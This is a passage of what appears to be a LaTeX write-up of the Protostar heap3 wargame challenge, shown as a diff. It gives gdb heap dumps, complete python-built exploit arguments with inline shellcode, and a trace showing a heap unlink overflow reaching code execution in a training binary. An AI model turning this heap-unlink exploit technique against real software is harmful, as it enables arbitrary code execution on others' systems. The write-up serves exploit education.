+0x804c020:      0x41414141      0x41414141      0xfffffffc      0xfffffffc
+0x804c030:      0x0804c004      0xbffff750      0x0804c05c      0x00000000
+0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804c050:      0x00000000      0x00000029      0xf0f0f0f0      0x90900ceb
+0x804c060:      0x90909090      0x90909090      0xc0319090      0x2ab3db31
+0x804c070:      0x80cd01b0      0x90909090      0x00000000      0x00000f89
+(gdb) c
+Continuing.
+
+Breakpoint 2, main (argc=4, argv=0xbffff804) at heap3/heap3.c:26
+26      in heap3/heap3.c
+(gdb) x/32x 0x0804c000
+0x804c000:      0x00000000      0x00000029      0x41414141      0x41414141
+0x804c010:      0x41414141      0x41414141      0x41414141      0x41414141
+0x804c020:      0x41414141      0xfffffff8      0xfffffffc      0xfffffffc
+0x804c030:      0xfffffff9      0x0804b194      0x0804b194      0x00000000
+0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804c050:      0x00000000      0x00000fb1      0x00000000      0x90900ceb
+0x804c060:      0x90909090      0xbffff750      0xc0319090      0x2ab3db31
+0x804c070:      0x80cd01b0      0x90909090      0x00000000      0x00000f89
+(gdb) c
+Continuing.
+dynamite failed?
+
+Program exited with code 052.
+(gdb) print 052
+$1 = 42
+\end{lstlisting}
+
+Here, I added two breakpoints to watch both precisely how my buffer is initially
+placed in memory, and then how it's affected immediately after the
+\texttt{unlink} macro is executed. We can see our \texttt{0xf0f0f0f0} was
+overwritten with null bytes, but more importantly, we see that the
+4 bytes of our shellcode starting at \texttt{0804c064} were clobbered
+during the \texttt{unlink}. Continuing execution, we see that we
+exit with status 052 in octal, which is 42 in decimal, demonstrating that
+we now have code execution. Just to be clear, we can exploit the program again,
+after having placed a breakpoint at main's return instruction, then
+instruction-stepping into our shellcode.
+
+\begin{lstlisting}
+(gdb) r `python -c 'print("A"*32 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff")'` `python -c 'print("\x04\xc0\x04\x08"+"\x50\xf7\xff\xbf"+"\x5c\xc0\x04\x08")'` `python -c 'print("\xf0"*4+"\xeb\x0c\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x31\xdb\xb3\x2a\xb0\x01\xcd\x80"+"\x90"*4)'`
+
+Breakpoint 3, 0x0804893b in main (argc=134514825, argv=0x4) at heap3/heap3.c:29
+29      in heap3/heap3.c
+(gdb) si
+0x0804c05c in ?? ()
+(gdb) x/i 0x0804c05c
+0x804c05c:      jmp    0x804c06a
+(gdb) x/10i 0x0804c06a
+0x804c06a:      xor    %eax,%eax
+0x804c06c:      xor    %ebx,%ebx
+0x804c06e:      mov    $0x2a,%bl
+0x804c070:      mov    $0x1,%al
+0x804c072:      int    $0x80
+0x804c074:      nop
+0x804c075:      nop
+0x804c076:      nop
+0x804c077:      nop
+0x804c078:      add    %al,(%eax)
+(gdb) c
+Continuing.
+dynamite failed?
+
+Program exited with code 052.
+\end{lstlisting}
+
+We can plainly see that we jump to our shellcode. What we also notice
+is that our shellcode performs a short (relative) jump to the standard
+\texttt{exit(42)} shellcode from before. To fully complete the challenge,
+we want to call to \texttt{winner} function, then clean up after ourselves
+so that the program can exit normally. This is left as an excercise for the
+reader.
+% /opt/protostar/bin/heap3 `python -c 'print("A"*32 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff")'` `python -c 'print("\x04\xc0\x04\x08"+"\x40\xf7\xff\xbf"+"\x5c\xc0\x04\x08"+"\x04\xc0\x04\x08"*5)'` `python -c 'print("\x90"*32)'`
